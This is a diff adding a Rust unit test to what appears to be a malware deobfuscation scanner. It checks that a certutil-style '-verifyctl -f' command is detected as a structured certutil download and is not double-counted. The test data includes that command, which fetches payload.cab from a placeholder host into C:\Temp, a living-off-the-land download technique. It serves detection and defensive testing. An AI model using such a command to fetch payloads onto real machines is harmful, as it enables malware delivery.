@@ -21606,6 +21606,39 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
     }
 
     #[test]
+    fn certutil_verifyctl_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -verifyctl -f https://certutil-verifyctl-deob.example/payload.cab C:\Temp\payload.cab"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://certutil-verifyctl-deob.example/payload.cab"
+                        && dst == "C:\\Temp\\payload.cab"
+            )
+        });
+        assert!(
+            has,
+            "certutil verifyctl deob-text source was not structured: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("certutil-verifyctl-deob.example"))
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "certutil verifyctl URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certutil_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
